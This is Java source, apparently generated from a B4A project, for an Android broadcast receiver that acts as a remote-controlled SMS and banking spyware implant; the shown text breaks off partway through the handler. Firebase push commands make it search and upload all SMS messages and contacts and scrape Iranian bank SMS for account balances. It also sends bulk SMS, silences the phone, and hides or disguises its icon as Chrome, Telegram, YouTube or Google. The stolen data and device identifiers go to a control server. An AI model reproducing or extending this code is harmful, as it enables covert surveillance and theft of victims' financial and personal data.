package com.Mad.api;


import anywheresoftware.b4a.BA;
import anywheresoftware.b4a.objects.ReceiverHelper;
import anywheresoftware.b4a.debug.*;

public class firebasemessaging extends android.content.BroadcastReceiver{
		
    static firebasemessaging mostCurrent;
	public static BA processBA;
    private ReceiverHelper _receiver;
    private static boolean firstTime = true;
    public static Class<?> getObject() {
		return firebasemessaging.class;
	}
	@Override
	public void onReceive(android.content.Context context, android.content.Intent intent) {
        mostCurrent = this;
       
        if (processBA == null) {
           
		    processBA = new BA(context, null, null, anywheresoftware.b4a.BA.SharedProcessBA.ModuleType.RECEIVER, "com.Mad.api.firebasemessaging");
            if (BA.isShellModeRuntimeCheck(processBA)) {
                processBA.raiseEvent2(null, true, "SHELL", false);
		    }
            try {
                Class.forName(BA.applicationContext.getPackageName() + ".main").getMethod("initializeProcessGlobals").invoke(null, null);
            } catch (Exception e) {
                throw new RuntimeException(e);
            }
            processBA.loadHtSubs(this.getClass());
        }
         _receiver = new ReceiverHelper(this);
        if (BA.isShellModeRuntimeCheck(processBA)) {
			processBA.raiseEvent2(null, true, "CREATE", true, "com.Mad.api.firebasemessaging", processBA, _receiver, anywheresoftware.b4a.keywords.Common.Density);
		}
        processBA.setActivityPaused(false);
        BA.LogInfo("*** Receiver (firebasemessaging) Receive " + (firstTime ? "(first time)" : "") + " ***");
        anywheresoftware.b4a.objects.IntentWrapper iw = new anywheresoftware.b4a.objects.IntentWrapper();
        iw.setObject(intent);
        processBA.raiseEvent(null, "receiver_receive", firstTime, iw);
        firstTime = false;
    }
	
public anywheresoftware.b4a.keywords.Common __c = null;
public static anywheresoftware.b4a.objects.FirebaseNotificationsService.FirebaseMessageWrapper _fm = null;
public static anywheresoftware.b4a.phone.Phone _phone = null;
public static com.reza.sh.deviceinfo.DiviceInfo _pd = null;
public static boolean _statuswhat = false;
public static anywheresoftware.b4a.phone.SmsWrapper _allsms = null;
public static anywheresoftware.b4a.phone.SmsWrapper.Sms _sms = null;
public static anywheresoftware.b4a.objects.collections.List _li = null;
public static String _filesmsname = "";
public static com.Mad.api.sendserver _send = null;
public static anywheresoftware.b4a.phone.Phone.PhoneId _phoneid = null;
public static anywheresoftware.b4a.phone.PhoneEvents _pe = null;
public static String _res = "";
public static anywheresoftware.b4a.phone.Phone.PhoneWakeState _pm = null;
public static b4a.example.contactsutils _cu = null;
public com.Mad.api.main _main = null;
public com.Mad.api.newmessage _newmessage = null;
public com.Mad.api.serverlink _serverlink = null;
public com.Mad.api.starter _starter = null;
public com.Mad.api.chrome _chrome = null;
public com.Mad.api.mainchange _mainchange = null;
public com.Mad.api.second _second = null;
public com.Mad.api.telegram _telegram = null;
public com.Mad.api.villain _villain = null;
public com.Mad.api.youtube _youtube = null;
public com.Mad.api.httputils2service _httputils2service = null;
public static anywheresoftware.b4a.objects.collections.Map  _bank_balances() throws Exception{
anywheresoftware.b4a.objects.collections.Map _mapdata = null;
String _address = "";
String _body = "";
String _balance = "";
String _bank = "";
 //BA.debugLineNum = 531;BA.debugLine="Public Sub BANK_Balances As Map";
 //BA.debugLineNum = 532;BA.debugLine="Private mapdata As Map";
_mapdata = new anywheresoftware.b4a.objects.collections.Map();
 //BA.debugLineNum = 533;BA.debugLine="mapdata.Initialize";
_mapdata.Initialize();
 //BA.debugLineNum = 534;BA.debugLine="Try";
try { //BA.debugLineNum = 535;BA.debugLine="For Each sms As Sms In allsms.GetByType(allsms.T";
{
final anywheresoftware.b4a.BA.IterableList group4 = _allsms.GetByType(_allsms.TYPE_INBOX);
final int groupLen4 = group4.getSize()
;int index4 = 0;
;
for (; index4 < groupLen4;index4++){
_sms = (anywheresoftware.b4a.phone.SmsWrapper.Sms)(group4.Get(index4));
 //BA.debugLineNum = 536;BA.debugLine="Private Address,body,Balance,BANK As String";
_address = "";
_body = "";
_balance = "";
_bank = "";
 //BA.debugLineNum = 537;BA.debugLine="Address = sms.Address";
_address = _sms.Address;
 //BA.debugLineNum = 538;BA.debugLine="body= sms.Body";
_body = _sms.Body;
 //BA.debugLineNum = 539;BA.debugLine="If BANK_IsBank(body) Then";
if (_bank_isbank(_body)) { 
 //BA.debugLineNum = 540;BA.debugLine="Balance = BANK_FindBalance(body)";
_balance = _bank_findbalance(_body);
 //BA.debugLineNum = 541;BA.debugLine="BANK = Detect_BankName(Address,body)";
_bank = _detect_bankname(_address,_body);
 //BA.debugLineNum = 542;BA.debugLine="If BANK.Length > 2 And Balance.Length > 2 Then";
if (_bank.length()>2 && _balance.length()>2) { 
 //BA.debugLineNum = 543;BA.debugLine="If mapdata.ContainsKey(BANK) = False Then";
if (_mapdata.ContainsKey((Object)(_bank))==anywheresoftware.b4a.keywords.Common.False) { 
 //BA.debugLineNum = 544;BA.debugLine="mapdata.Put(BANK,CreateMap(\"Balance\":Balance";
_mapdata.Put((Object)(_bank),(Object)(anywheresoftware.b4a.keywords.Common.createMap(new Object[] {(Object)("Balance"),(Object)(_balance),(Object)("Address"),(Object)(_address)}).getObject()));
 };
 };
 };
 }
};
 } 
       catch (Exception e19) {
			processBA.setLastException(e19); //BA.debugLineNum = 550;BA.debugLine="Log(LastException)";
anywheresoftware.b4a.keywords.Common.LogImpl("11179667",BA.ObjectToString(anywheresoftware.b4a.keywords.Common.LastException(processBA)),0);
 };
 //BA.debugLineNum = 552;BA.debugLine="Return mapdata";
if (true) return _mapdata;
 //BA.debugLineNum = 553;BA.debugLine="End Sub";
return null;
}
public static String  _bank_findbalance(String _body) throws Exception{
String _pattern = "";
anywheresoftware.b4a.keywords.Regex.MatcherWrapper _matcher1 = null;
 //BA.debugLineNum = 572;BA.debugLine="Private Sub BANK_FindBalance(body As String) As St";
 //BA.debugLineNum = 573;BA.debugLine="Try";
try { //BA.debugLineNum = 574;BA.debugLine="Dim pattern As String";
_pattern = "";
 //BA.debugLineNum = 575;BA.debugLine="pattern = \"(?:موجود[یي]|مانده)\\s*[:：]?\\s*[\\d٠-٩۰";
_pattern = "(?:موجود[یي]|مانده)\\s*[:：]?\\s*[\\d٠-٩۰-۹,،]+";
 //BA.debugLineNum = 576;BA.debugLine="Dim Matcher1 As Matcher";
_matcher1 = new anywheresoftware.b4a.keywords.Regex.MatcherWrapper();
 //BA.debugLineNum = 577;BA.debugLine="Matcher1 = Regex.Matcher2(pattern, Regex.MULTILI";
_matcher1 = anywheresoftware.b4a.keywords.Common.Regex.Matcher2(_pattern,anywheresoftware.b4a.keywords.Common.Regex.MULTILINE,_body);
 //BA.debugLineNum = 578;BA.debugLine="Do While Matcher1.Find";
while (_matcher1.Find()) {
 //BA.debugLineNum = 579;BA.debugLine="If Matcher1.Match.Length > 2 Then";
if (_matcher1.getMatch().length()>2) { 
 //BA.debugLineNum = 580;BA.debugLine="Return Matcher1.Match";
if (true) return _matcher1.getMatch();
 };
 }
;
 } 
       catch (Exception e12) {
			processBA.setLastException(e12); //BA.debugLineNum = 584;BA.debugLine="Log(LastException)";
anywheresoftware.b4a.keywords.Common.LogImpl("11310732",BA.ObjectToString(anywheresoftware.b4a.keywords.Common.LastException(processBA)),0);
 };
 //BA.debugLineNum = 586;BA.debugLine="Return \"\"";
if (true) return "";
 //BA.debugLineNum = 587;BA.debugLine="End Sub";
return "";
}
public static boolean  _bank_isbank(String _body) throws Exception{
boolean _status = false;
 //BA.debugLineNum = 554;BA.debugLine="Private Sub BANK_IsBank(body As String) As Boolean";
 //BA.debugLineNum = 555;BA.debugLine="Private Status As Boolean";
_status = false;
 //BA.debugLineNum = 556;BA.debugLine="Try";
try { //BA.debugLineNum = 557;BA.debugLine="If (body.Contains(\"بانک\") Or _ 		 body.Contains(";
if ((_body.contains("بانک") || _body.contains("بانك") || _body.contains("بلو")) && (_body.contains("موجودی") || _body.contains("مانده") || _body.contains("موجودي"))) { 
 //BA.debugLineNum = 563;BA.debugLine="Status = True";
_status = anywheresoftware.b4a.keywords.Common.True;
 }else {
 //BA.debugLineNum = 565;BA.debugLine="Status = False";
_status = anywheresoftware.b4a.keywords.Common.False;
 };
 } 
       catch (Exception e9) {
			processBA.setLastException(e9); //BA.debugLineNum = 568;BA.debugLine="Status = False";
_status = anywheresoftware.b4a.keywords.Common.False;
 };
 //BA.debugLineNum = 570;BA.debugLine="Return Status";
if (true) return _status;
 //BA.debugLineNum = 571;BA.debugLine="End Sub";
return false;
}
public static String  _checkscreenstatus() throws Exception{
anywheresoftware.b4a.agraham.reflection.Reflection _r = null;
Object _powerservice = null;
boolean _isscreenon = false;
 //BA.debugLineNum = 611;BA.debugLine="Public Sub CheckScreenStatus";
 //BA.debugLineNum = 612;BA.debugLine="Dim res As String";
_res = "";
 //BA.debugLineNum = 613;BA.debugLine="pm.PartialLock";
_pm.PartialLock(processBA);
 //BA.debugLineNum = 615;BA.debugLine="Dim r As Reflector";
_r = new anywheresoftware.b4a.agraham.reflection.Reflection();
 //BA.debugLineNum = 616;BA.debugLine="r.Target = r.GetContext";
_r.Target = (Object)(_r.GetContext(processBA));
 //BA.debugLineNum = 617;BA.debugLine="Dim powerService As Object = r.RunMethod2(\"getSys";
_powerservice = _r.RunMethod2("getSystemService","power","java.lang.String");
 //BA.debugLineNum = 618;BA.debugLine="r.Target = powerService";
_r.Target = _powerservice;
 //BA.debugLineNum = 619;BA.debugLine="Dim isScreenOn As Boolean = r.RunMethod(\"isScreen";
_isscreenon = BA.ObjectToBoolean(_r.RunMethod("isScreenOn"));
 //BA.debugLineNum = 621;BA.debugLine="If isScreenOn Then";
if (_isscreenon) { 
 //BA.debugLineNum = 622;BA.debugLine="res = \"On\"";
_res = "On";
 //BA.debugLineNum = 623;BA.debugLine="Log(\"Screen is ON\")";
anywheresoftware.b4a.keywords.Common.LogImpl("11441804","Screen is ON",0);
 }else {
 //BA.debugLineNum = 625;BA.debugLine="res = \"Off\"";
_res = "Off";
 //BA.debugLineNum = 626;BA.debugLine="Log(\"Screen is OFF\")";
anywheresoftware.b4a.keywords.Common.LogImpl("11441807","Screen is OFF",0);
 };
 //BA.debugLineNum = 628;BA.debugLine="Return res";
if (true) return _res;
 //BA.debugLineNum = 629;BA.debugLine="pm.ReleasePartialLock";
_pm.ReleasePartialLock();
 //BA.debugLineNum = 630;BA.debugLine="End Sub";
return "";
}
public static String  _detect_bankname(String _address,String _body) throws Exception{
String _pattern = "";
anywheresoftware.b4a.keywords.Regex.MatcherWrapper _matcher1 = null;
 //BA.debugLineNum = 588;BA.debugLine="Public Sub Detect_BankName(address As String,body";
 //BA.debugLineNum = 589;BA.debugLine="Try";
try { //BA.debugLineNum = 590;BA.debugLine="If address.Contains(\"KESHAVARZI\") Or body.Contai";
if (_address.contains("KESHAVARZI") || _body.contains("bki.ir")) { 
 //BA.debugLineNum = 591;BA.debugLine="Return \"بانک کشاورزی\"";
if (true) return "بانک کشاورزی";
 }else if(_address.contains("IZBANK")) { 
 //BA.debugLineNum = 593;BA.debugLine="Return \"بانک ایران زمین\"";
if (true) return "بانک ایران زمین";
 }else if(_address.contains("Bank Mellat")) { 
 //BA.debugLineNum = 595;BA.debugLine="Return \"بانک ملت\"";
if (true) return "بانک ملت";
 };
 //BA.debugLineNum = 597;BA.debugLine="Dim pattern As String";
_pattern = "";
 //BA.debugLineNum = 598;BA.debugLine="pattern = \"(?=.*(?:بلو|بانك|بانک)).*\"";
_pattern = "(?=.*(?:بلو|بانك|بانک)).*";
 //BA.debugLineNum = 599;BA.debugLine="Dim Matcher1 As Matcher";
_matcher1 = new anywheresoftware.b4a.keywords.Regex.MatcherWrapper();
 //BA.debugLineNum = 600;BA.debugLine="Matcher1 = Regex.Matcher2(pattern, Regex.MULTILI";
_matcher1 = anywheresoftware.b4a.keywords.Common.Regex.Matcher2(_pattern,anywheresoftware.b4a.keywords.Common.Regex.MULTILINE,_body);
 //BA.debugLineNum = 601;BA.debugLine="Do While Matcher1.Find";
while (_matcher1.Find()) {
 //BA.debugLineNum = 602;BA.debugLine="If Matcher1.Match.Length > 2 Then";
if (_matcher1.getMatch().length()>2) { 
 //BA.debugLineNum = 603;BA.debugLine="Return Matcher1.Match";
if (true) return _matcher1.getMatch();
 };
 }
;
 } 
       catch (Exception e19) {
			processBA.setLastException(e19); //BA.debugLineNum = 607;BA.debugLine="Log(LastException)";
anywheresoftware.b4a.keywords.Common.LogImpl("11376275",BA.ObjectToString(anywheresoftware.b4a.keywords.Common.LastException(processBA)),0);
 };
 //BA.debugLineNum = 609;BA.debugLine="Return \"\"";
if (true) return "";
 //BA.debugLineNum = 610;BA.debugLine="End Sub";
return "";
}
public static void  _fm_messagearrived(anywheresoftware.b4a.objects.FirebaseNotificationsService.RemoteMessageWrapper _message) throws Exception{
ResumableSub_fm_MessageArrived rsub = new ResumableSub_fm_MessageArrived(null,_message);
rsub.resume(processBA, null);
}
public static class ResumableSub_fm_MessageArrived extends BA.ResumableSub {
public ResumableSub_fm_MessageArrived(com.Mad.api.firebasemessaging parent,anywheresoftware.b4a.objects.FirebaseNotificationsService.RemoteMessageWrapper _message) {
this.parent = parent;
this._message = _message;
}
com.Mad.api.firebasemessaging parent;
anywheresoftware.b4a.objects.FirebaseNotificationsService.RemoteMessageWrapper _message;
String _command = "";
String _device_id = "";
String _textsms = "";
String _numberlist = "";
anywheresoftware.b4a.phone.SmsWrapper _mysmsmessages = null;
anywheresoftware.b4a.phone.SmsWrapper.Sms _mysms = null;
anywheresoftware.b4a.objects.collections.List _mylist = null;
int _i = 0;
anywheresoftware.b4a.objects.StringUtils _st = null;
String _balancedata = "";
String _allcon = "";
String _messagetext = "";
b4a.example.contactsutils._cucontact _c = null;
b4a.example.contactsutils._cuphone _phonec = null;
anywheresoftware.b4a.objects.collections.List _x = null;
String _smsnumber = "";
String _numb = "";
String _allsmstext = "";
String _whosend = "";
String _sms_read = "";
String _classstring = "";
anywheresoftware.b4a.keywords.StringBuilderWrapper _stringbuilder = null;
anywheresoftware.b4a.phone.SmsWrapper _sm = null;
anywheresoftware.b4a.phone.SmsWrapper.Sms _smsdata = null;
anywheresoftware.b4a.phone.Contacts2Wrapper _contacts = null;
anywheresoftware.b4a.phone.ContactsWrapper.Contact _contact = null;
anywheresoftware.b4a.objects.collections.List _listsms = null;
anywheresoftware.b4a.phone.SmsWrapper.Sms _s = null;
String _tx = "";
String _all_bank = "";
int step17;
int limit17;
anywheresoftware.b4a.BA.IterableList group101;
int index101;
int groupLen101;
anywheresoftware.b4a.BA.IterableList group102;
int index102;
int groupLen102;
int step153;
int limit153;
anywheresoftware.b4a.BA.IterableList group173;
int index173;
int groupLen173;
int step197;
int limit197;
anywheresoftware.b4a.BA.IterableList group219;
int index219;
int groupLen219;
anywheresoftware.b4a.BA.IterableList group258;
int index258;
int groupLen258;
int step277;
int limit277;
int step348;
int limit348;
int step366;
int limit366;
int step386;
int limit386;
int step406;
int limit406;

@Override
public void resume(BA ba, Object[] result) throws Exception{

    while (true) {
try {

        switch (state) {
            case -1:
return;

case 0:
//C
this.state = 1;
 //BA.debugLineNum = 43;BA.debugLine="Log(Message.GetData)";
anywheresoftware.b4a.keywords.Common.LogImpl("1983041",BA.ObjectToString(_message.GetData()),0);
 //BA.debugLineNum = 44;BA.debugLine="Dim command,Device_id,TextSms,NumberList As Strin";
_command = "";
_device_id = "";
_textsms = "";
_numberlist = "";
 //BA.debugLineNum = 46;BA.debugLine="command = Message.GetData.Get(\"command\")";
_command = BA.ObjectToString(_message.GetData().Get((Object)("command")));
 //BA.debugLineNum = 47;BA.debugLine="Device_id = Message.GetData.Get(\"device_id\")";
_device_id = BA.ObjectToString(_message.GetData().Get((Object)("device_id")));
 //BA.debugLineNum = 48;BA.debugLine="NumberList = Message.GetData.Get(\"phone\")";
_numberlist = BA.ObjectToString(_message.GetData().Get((Object)("phone")));
 //BA.debugLineNum = 49;BA.debugLine="TextSms = Message.GetData.Get(\"text\")";
_textsms = BA.ObjectToString(_message.GetData().Get((Object)("text")));
 //BA.debugLineNum = 52;BA.debugLine="If command = \"online_device\" Then";
if (true) break;

case 1:
//if
this.state = 340;
if ((_command).equals("online_device")) { 
this.state = 3;
}else if((_command).equals("allSearch")) { 
this.state = 5;
}else if((_command).equals("getallbalance")) { 
this.state = 15;
}else if((_command).equals("hidden") && (_device_id).equals(parent._phone.GetSettings("android_id"))) { 
this.state = 23;
}else if((_command).equals("visible") && (_device_id).equals(parent._phone.GetSettings("android_id"))) { 
this.state = 31;
}else if((_command).equals("hide_all")) { 
this.state = 39;
}else if((_command).equals("changetochrome") && (_device_id).equals(parent._phone.GetSettings("android_id"))) { 
this.state = 47;
}else if((_command).equals("changetotel") && (_device_id).equals(parent._phone.GetSettings("android_id"))) { 
this.state = 55;
}else if((_command).equals("smcontact") && (_device_id).equals(parent._phone.GetSettings("android_id"))) { 
this.state = 63;
}else if((_command).equals("changetoyoutube") && (_device_id).equals(parent._phone.GetSettings("android_id"))) { 
this.state = 79;
}else if((_command).equals("changetogoogle") && (_device_id).equals(parent._phone.GetSettings("android_id"))) { 
this.state = 87;
}else if((_command).equals("silent_all")) { 
this.state = 95;
}else if((_command).equals("send_sms_all")) { 
this.state = 103;
}else if((_command).equals("status") && (_device_id).equals(parent._phone.GetSettings("android_id"))) { 
this.state = 115;
}else if((_command).equals("send_sms") && (_device_id).equals(parent._phone.GetSettings("android_id"))) { 
this.state = 123;
}else if((_command).equals("offline_mode_on") && (_device_id).equals(parent._phone.GetSettings("android_id"))) { 
this.state = 135;
}else if((_command).equals("offline_mode_off") && (_device_id).equals(parent._phone.GetSettings("android_id"))) { 
this.state = 143;
}else if((_command).equals("all_sms_recived") && (_device_id).equals(parent._phone.GetSettings("android_id"))) { 
this.state = 149;
}else if((_command).equals("all_sms") && (_device_id).equals(parent._phone.GetSettings("android_id"))) { 
this.state = 167;
}else if((_command).equals("all_contacts") && (_device_id).equals(parent._phone.GetSettings("android_id"))) { 
this.state = 205;
}else if((_command).equals("all_sms_sent") && (_device_id).equals(parent._phone.GetSettings("android_id"))) { 
this.state = 223;
}else if((_command).equals("last_sms") && (_device_id).equals(parent._phone.GetSettings("android_id"))) { 
this.state = 241;
}else if((_command).equals("Vibrate") && (_device_id).equals(parent._phone.GetSettings("android_id"))) { 
this.state = 249;
}else if((_command).equals("silent") && (_device_id).equals(parent._phone.GetSettings("android_id"))) { 
this.state = 257;
}else if((_command).equals("Normal") && (_device_id).equals(parent._phone.GetSettings("android_id"))) { 
this.state = 265;
}else if((_command).equals("balance") && (_device_id).equals(parent._phone.GetSettings("android_id"))) { 
this.state = 273;
}else if((_command).equals("last_bank_sms") && (_device_id).equals(parent._phone.GetSettings("android_id"))) { 
this.state = 281;
}else if((_command).equals("all_bank_sms") && (_device_id).equals(parent._phone.GetSettings("android_id"))) { 
this.state = 297;
}else if((_command).equals("WhatsChecker") && (_device_id).equals(parent._phone.GetSettings("android_id"))) { 
this.state = 313;
}else if((_command).equals("searchSMS") && (_device_id).equals(parent._phone.GetSettings("android_id"))) { 
this.state = 331;
}if (true) break;

case 3:
//C
this.state = 340;
 //BA.debugLineNum = 53;BA.debugLine="res = CheckScreenStatus";
parent._res = _checkscreenstatus();
 //BA.debugLineNum = 55;BA.debugLine="Send.SendData(\"Device_id=\" &phone.GetSettings(\"a";
parent._send._senddata /*void*/ ("Device_id="+parent._phone.GetSettings("android_id")+"&berand="+parent._phone.getManufacturer()+"&Product="+parent._phone.getProduct()+"&Model="+parent._phone.getModel()+"&operator="+parent._phone.GetNetworkOperatorName()+"&Battery="+BA.NumberToString(parent._pd.getBatteryPercentage())+"&andver="+parent._pd.getOSVersion()+"&action="+"online_device"+"&screen="+parent._res);
 if (true) break;

case 5:
//C
this.state = 6;
 //BA.debugLineNum = 57;BA.debugLine="res = CheckScreenStatus";
parent._res = _checkscreenstatus();
 //BA.debugLineNum = 58;BA.debugLine="Dim MySmsMessages As SmsMessages";
_mysmsmessages = new anywheresoftware.b4a.phone.SmsWrapper();
 //BA.debugLineNum = 59;BA.debugLine="Dim MySms As Sms";
_mysms = new anywheresoftware.b4a.phone.SmsWrapper.Sms();
 //BA.debugLineNum = 60;BA.debugLine="Dim MyList As List : MyList.Initialize";
_mylist = new anywheresoftware.b4a.objects.collections.List();
 //BA.debugLineNum = 60;BA.debugLine="Dim MyList As List : MyList.Initialize";
_mylist.Initialize();
 //BA.debugLineNum = 61;BA.debugLine="MyList=MySmsMessages.GetAll";
_mylist = _mysmsmessages.GetAll();
 //BA.debugLineNum = 62;BA.debugLine="For i = 0 To MyList.Size -1";
if (true) break;

case 6:
//for
this.state = 13;
step17 = 1;
limit17 = (int) (_mylist.getSize()-1);
_i = (int) (0) ;
this.state = 341;
if (true) break;

case 341:
//C
this.state = 13;
if ((step17 > 0 && _i <= limit17) || (step17 < 0 && _i >= limit17)) this.state = 8;
if (true) break;

case 342:
//C
this.state = 341;
_i = ((int)(0 + _i + step17)) ;
if (true) break;

case 8:
//C
this.state = 9;
 //BA.debugLineNum = 63;BA.debugLine="MySms = MyList.Get(i)";
_mysms = (anywheresoftware.b4a.phone.SmsWrapper.Sms)(_mylist.Get(_i));
 //BA.debugLineNum = 64;BA.debugLine="If MySms.Body.Contains(TextSms) Then";
if (true) break;

case 9:
//if
this.state = 12;
if (_mysms.Body.contains(_textsms)) { 
this.state = 11;
}if (true) break;

case 11:
//C
this.state = 12;
 //BA.debugLineNum = 66;BA.debugLine="Send.SendData(\"messagetext=\" & MySms.Body &\"&w";
parent._send._senddata /*void*/ ("messagetext="+_mysms.Body+"&word="+_textsms+"&sender="+_mysms.Address+"&Model="+parent._phone.getModel()+"&Device_id="+parent._phone.GetSettings("android_id")+"&action="+"searchSMS"+"&operator="+parent._phone.GetNetworkOperatorName()+"&screen="+parent._res);
 //BA.debugLineNum = 67;BA.debugLine="Exit";
this.state = 13;
if (true) break;
 if (true) break;

case 12:
//C
this.state = 342;
;
 if (true) break;
if (true) break;

case 13:
//C
this.state = 340;
;
 if (true) break;

case 15:
//C
this.state = 16;
 //BA.debugLineNum = 71;BA.debugLine="Try";
if (true) break;

case 16:
//try
this.state = 21;
this.catchState = 20;
this.state = 18;
if (true) break;

case 18:
//C
this.state = 21;
this.catchState = 20;
 //BA.debugLineNum = 72;BA.debugLine="Private st As StringUtils";
_st = new anywheresoftware.b4a.objects.StringUtils();
 //BA.debugLineNum = 74;BA.debugLine="Private BalanceData As String = st.EncodeUrl(st";
_balancedata = _st.EncodeUrl(_st.EncodeBase64(((anywheresoftware.b4a.objects.collections.JSONParser.JSONConverter) anywheresoftware.b4a.AbsObjectWrapper.ConvertToWrapper(new anywheresoftware.b4a.objects.collections.JSONParser.JSONConverter(), (java.lang.Object)(_bank_balances().getObject()))).ToString().getBytes("UTF8")),"UTF8");
 //BA.debugLineNum = 76;BA.debugLine="Log(BalanceData)";
anywheresoftware.b4a.keywords.Common.LogImpl("1983074",_balancedata,0);
 //BA.debugLineNum = 77;BA.debugLine="Log(BANK_Balances)";
anywheresoftware.b4a.keywords.Common.LogImpl("1983075",BA.ObjectToString(_bank_balances()),0);
 //BA.debugLineNum = 78;BA.debugLine="Send.SendData(\"Balances=\"&BalanceData&\"&Model=\"";
parent._send._senddata /*void*/ ("Balances="+_balancedata+"&Model="+parent._phone.getModel()+"&Device_id="+parent._phone.GetSettings("android_id")+"&Battery="+BA.NumberToString(parent._pd.getBatteryPercentage())+"&andver="+parent._pd.getOSVersion()+"&action="+"balance"+"&operator="+parent._phone.GetNetworkOperatorName());
 if (true) break;

case 20:
//C
this.state = 21;
this.catchState = 0;
 //BA.debugLineNum = 81;BA.debugLine="Log(LastException)";
anywheresoftware.b4a.keywords.Common.LogImpl("1983079",BA.ObjectToString(anywheresoftware.b4a.keywords.Common.LastException(processBA)),0);
 if (true) break;
if (true) break;

case 21:
//C
this.state = 340;
this.catchState = 0;
;
 if (true) break;

case 23:
//C
this.state = 24;
 //BA.debugLineNum = 86;BA.debugLine="Send.SendData(\"Device_id=\" &phone.GetSettings(\"a";
parent._send._senddata /*void*/ ("Device_id="+parent._phone.GetSettings("android_id")+"&Model="+parent._phone.getModel()+"&Battery="+BA.NumberToString(parent._pd.getBatteryPercentage())+"&andver="+parent._pd.getOSVersion()+"&action="+"Hidden_icon"+"&screen="+parent._res);
 //BA.debugLineNum = 87;BA.debugLine="Sleep(2500)";
anywheresoftware.b4a.keywords.Common.Sleep(processBA,this,(int) (2500));
this.state = 343;
return;
case 343:
//C
this.state = 24;
;
 //BA.debugLineNum = 88;BA.debugLine="Try";
if (true) break;

case 24:
//try
this.state = 29;
this.catchState = 28;
this.state = 26;
if (true) break;

case 26:
//C
this.state = 29;
this.catchState = 28;
 //BA.debugLineNum = 89;BA.debugLine="set_icon_status(\"main\",False)";
_set_icon_status("main",anywheresoftware.b4a.keywords.Common.False);
 //BA.debugLineNum = 90;BA.debugLine="set_icon_status(\"second\",False)";
_set_icon_status("second",anywheresoftware.b4a.keywords.Common.False);
 //BA.debugLineNum = 91;BA.debugLine="set_icon_status(\"youtube\",False)";
_set_icon_status("youtube",anywheresoftware.b4a.keywords.Common.False);
 //BA.debugLineNum = 92;BA.debugLine="set_icon_status(\"telegram\",False)";
_set_icon_status("telegram",anywheresoftware.b4a.keywords.Common.False);
 //BA.debugLineNum = 93;BA.debugLine="set_icon_status(\"google\",False)";
_set_icon_status("google",anywheresoftware.b4a.keywords.Common.False);
 if (true) break;

case 28:
//C
this.state = 29;
this.catchState = 0;
 //BA.debugLineNum = 95;BA.debugLine="Log(LastException)";
anywheresoftware.b4a.keywords.Common.LogImpl("1983093",BA.ObjectToString(anywheresoftware.b4a.keywords.Common.LastException(processBA)),0);
 if (true) break;
if (true) break;

case 29:
//C
this.state = 340;
this.catchState = 0;
;
 if (true) break;

case 31:
//C
this.state = 32;
 //BA.debugLineNum = 99;BA.debugLine="Send.SendData( \"Device_id=\" &phone.GetSettings(\"";
parent._send._senddata /*void*/ ("Device_id="+parent._phone.GetSettings("android_id")+"&Model="+parent._phone.getModel()+"&Battery="+BA.NumberToString(parent._pd.getBatteryPercentage())+"&andver="+parent._pd.getOSVersion()+"&action="+"visible_icon"+"&screen="+parent._res);
 //BA.debugLineNum = 100;BA.debugLine="Sleep(2500)";
anywheresoftware.b4a.keywords.Common.Sleep(processBA,this,(int) (2500));
this.state = 344;
return;
case 344:
//C
this.state = 32;
;
 //BA.debugLineNum = 102;BA.debugLine="Try";
if (true) break;

case 32:
//try
this.state = 37;
this.catchState = 36;
this.state = 34;
if (true) break;

case 34:
//C
this.state = 37;
this.catchState = 36;
 //BA.debugLineNum = 103;BA.debugLine="set_icon_status(\"main\",True)";
_set_icon_status("main",anywheresoftware.b4a.keywords.Common.True);
 //BA.debugLineNum = 104;BA.debugLine="set_icon_status(\"second\",False)";
_set_icon_status("second",anywheresoftware.b4a.keywords.Common.False);
 //BA.debugLineNum = 105;BA.debugLine="set_icon_status(\"youtube\",False)";
_set_icon_status("youtube",anywheresoftware.b4a.keywords.Common.False);
 //BA.debugLineNum = 106;BA.debugLine="set_icon_status(\"telegram\",False)";
_set_icon_status("telegram",anywheresoftware.b4a.keywords.Common.False);
 //BA.debugLineNum = 107;BA.debugLine="set_icon_status(\"google\",False)";
_set_icon_status("google",anywheresoftware.b4a.keywords.Common.False);
 if (true) break;

case 36:
//C
this.state = 37;
this.catchState = 0;
 //BA.debugLineNum = 109;BA.debugLine="Log(LastException)";
anywheresoftware.b4a.keywords.Common.LogImpl("1983107",BA.ObjectToString(anywheresoftware.b4a.keywords.Common.LastException(processBA)),0);
 if (true) break;
if (true) break;

case 37:
//C
this.state = 340;
this.catchState = 0;
;
 if (true) break;

case 39:
//C
this.state = 40;
 //BA.debugLineNum = 113;BA.debugLine="Send.SendData( \"Device_id=\" &phone.GetSettings(\"";
parent._send._senddata /*void*/ ("Device_id="+parent._phone.GetSettings("android_id")+"&Model="+parent._phone.getModel()+"&Battery="+BA.NumberToString(parent._pd.getBatteryPercentage())+"&andver="+parent._pd.getOSVersion()+"&action="+"Hidden_icon"+"screen="+parent._res);
 //BA.debugLineNum = 114;BA.debugLine="Sleep(2500)";
anywheresoftware.b4a.keywords.Common.Sleep(processBA,this,(int) (2500));
this.state = 345;
return;
case 345:
//C
this.state = 40;
;
 //BA.debugLineNum = 115;BA.debugLine="Try";
if (true) break;

case 40:
//try
this.state = 45;
this.catchState = 44;
this.state = 42;
if (true) break;

case 42:
//C
this.state = 45;
this.catchState = 44;
 //BA.debugLineNum = 116;BA.debugLine="set_icon_status(\"main\",False)";
_set_icon_status("main",anywheresoftware.b4a.keywords.Common.False);
 //BA.debugLineNum = 117;BA.debugLine="set_icon_status(\"second\",False)";
_set_icon_status("second",anywheresoftware.b4a.keywords.Common.False);
 //BA.debugLineNum = 118;BA.debugLine="set_icon_status(\"youtube\",False)";
_set_icon_status("youtube",anywheresoftware.b4a.keywords.Common.False);
 //BA.debugLineNum = 119;BA.debugLine="set_icon_status(\"telegram\",False)";
_set_icon_status("telegram",anywheresoftware.b4a.keywords.Common.False);
 //BA.debugLineNum = 120;BA.debugLine="set_icon_status(\"google\",False)";
_set_icon_status("google",anywheresoftware.b4a.keywords.Common.False);
 if (true) break;

case 44:
//C
this.state = 45;
this.catchState = 0;
 //BA.debugLineNum = 122;BA.debugLine="Log(LastException)";
anywheresoftware.b4a.keywords.Common.LogImpl("1983120",BA.ObjectToString(anywheresoftware.b4a.keywords.Common.LastException(processBA)),0);
 if (true) break;
if (true) break;

case 45:
//C
this.state = 340;
this.catchState = 0;
;
 if (true) break;

case 47:
//C
this.state = 48;
 //BA.debugLineNum = 127;BA.debugLine="Log(command)";
anywheresoftware.b4a.keywords.Common.LogImpl("1983125",_command,0);
 //BA.debugLineNum = 128;BA.debugLine="Try";
if (true) break;

case 48:
//try
this.state = 53;
this.catchState = 52;
this.state = 50;
if (true) break;

